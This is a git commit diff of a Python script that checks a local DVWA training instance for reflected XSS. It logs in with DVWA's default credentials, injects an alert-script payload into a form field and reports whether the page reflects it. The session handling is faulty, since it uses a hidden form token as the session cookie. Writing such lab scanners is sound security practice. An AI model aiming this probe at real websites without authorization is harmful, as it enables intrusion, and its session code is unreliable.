51431643621eaaeb7f97c65be17ab3008c928f63
Elad Buhnik <eladb95@gmail.com>
2023-12-22 12:28:30 +0200

    Finish XSS weakness

--- Main_Dir/xss_feature.py
+++ Main_Dir/xss_feature.py
@@ -1,24 +1,64 @@
 from helper_generic_tags import GenericGetTags
 import requests
+from bs4 import BeautifulSoup as bs
+
+BASE_URL = "http://127.0.0.1:80/DVWA"
+
+VALUES = {
+    'username': 'admin',
+    'password': 'password',
+    'Login':'Login'
+}
+
+SCRIPT = "<script>alert('XSS')</script>"
+
+INJECT_DATA = {"name" : SCRIPT, "submit" : "Submit"}
 
 
-class Xss:
+def get_user_token() -> str:
+    with requests.Session() as c:
+        res = c.get(f"{BASE_URL}/login.php")
+        soup = bs(res.text, "html.parser")
+        cookie = soup.find_all("input", {"type": "hidden"})
+        user_token = cookie[0]["value"]
+        return user_token
+    
 
-    url = "http://localhost/DVWA/vulnerabilities/xss_r/"
+COOKIES_JSON = {
+    "PHPSESSID": get_user_token(),
+    "security": "low"
+}
 
-    input_tags = GenericGetTags.get_tags(url, "input", {"type" : "text"} )
 
-    if input_tags:
-        headers = {'Cookie': 'security=low; PHPSESSID=hjebv958mfu9u3ao2ropjl6'}
-        script = "<script>alert('XSS')</script>"
-        inject_data = {"name" : script, "Submit" : "Submit"}
-        req = requests.get(url, params = inject_data, headers = headers )
+def get_forms(html_page) -> list:
+    soup = bs(html_page, "html.parser")
+    forms = soup.find_all("form")
+    return list(forms)
 
-        if script in req.text:
-            print("XSS succeed!")
-        else:
-            print("XSS did not succeed!")
 
+def main():
+    
+    # Pass the login page: "http://127.0.0.1:80/DVWA/index.php"
+    session = requests.Session()
+    index_page_response = session.get(f"{BASE_URL}/index.php", cookies = COOKIES_JSON)
+
+    # Entering to xss reflected page : "http://127.0.0.1:80/DVWA/vulnerabilities/xss_r"
+    xss_r_page = session.get(f"{BASE_URL}/vulnerabilities/xss_r/", cookies=COOKIES_JSON)
+
+    # To see the structure of the data we need to send:
+    ls_forms = get_forms(xss_r_page.text)
+
+    # Inserting the data and in put the script in the name filed:
+    res = requests.get(f"{BASE_URL}/vulnerabilities/xss_r/", params = INJECT_DATA, cookies = COOKIES_JSON )
+    
+    # Check i the script saved in the website:
+    if SCRIPT in res.text:
+        print("Your website is vulnerable to XSS Injection attack!")
     else:
-        print("XSS did not succeed!")
+        print("Your website is NOT vulnerable to XSS Injection attack.")
 
+
+
+
+if __name__ == "__main__":
+    main()
